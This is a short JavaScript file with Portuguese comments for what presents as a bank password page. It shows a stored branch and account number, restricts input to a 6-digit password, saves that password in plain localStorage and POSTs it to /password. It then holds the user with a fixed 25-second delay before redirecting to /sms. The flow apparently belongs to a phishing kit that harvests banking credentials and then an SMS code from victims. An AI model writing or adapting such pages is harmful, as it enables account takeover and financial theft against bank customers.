// Alternar visualização da senha
function togglePassword() {
    const passwordInput = document.getElementById('password');
    const eyeIcon = document.getElementById('eye-icon');

    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIcon.classList.remove('fa-eye-slash');
        eyeIcon.classList.add('fa-eye');
    } else {
        passwordInput.type = 'password';
        eyeIcon.classList.remove('fa-eye');
        eyeIcon.classList.add('fa-eye-slash');
    }
}

// Recuperar agência e conta do localStorage
const agency = localStorage.getItem('agency') || '0000-0';
const account = localStorage.getItem('account') || '000000-0';

document.getElementById('show-agency').innerText = agency;
document.getElementById('show-account').innerText = account;

// Máscara para o campo de senha (apenas números, máximo 6 dígitos)
const passwordInput = document.getElementById('password');
passwordInput.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
});

// Validação do formulário
const form = document.getElementById('form');
const passwordError = document.getElementById('password-error');

form.addEventListener('submit', (e) => {
    e.preventDefault();

    const password = passwordInput.value.trim();

    if (password.length !== 6) {
        passwordError.classList.remove('hidden');
        passwordError.textContent = 'Informe uma senha de 6 dígitos.';
        passwordInput.classList.add('border-red-500');
        return;
    } else {
        passwordError.classList.add('hidden');
        passwordInput.classList.remove('border-red-500');
    }

    localStorage.setItem('password6', password);

    enviarSenha(password);
});

// Envio da senha para o backend
function enviarSenha(password) {
    showLoading(); // ⬅️ Mostra o loading antes de enviar

    fetch('/password', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ password6: password })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Erro ao enviar dados');
        }
        return response.json();
    })
    .then(data => {
        if (data && data.status === 'sucesso') {
            setTimeout(() => {
                hideLoading();
                window.location.href = '/sms';
            }, 25000); // ⏳ Delay fixo de 25 segundos
        } else {
            throw new Error('Erro no backend');
        }
    })
    .catch(() => {
        hideLoading();
        passwordError.classList.remove('hidden');
        passwordError.textContent = 'Erro ao validar sua senha. Tente novamente.';
        passwordInput.classList.add('border-red-500');
    });
}

// Funções para exibir/ocultar o loading
function showLoading() {
    const loading = document.getElementById('loading');
    if (loading) {
        loading.classList.remove('hidden');
    }
}

function hideLoading() {
    const loading = document.getElementById('loading');
    if (loading) {
        loading.classList.add('hidden');
    }
}
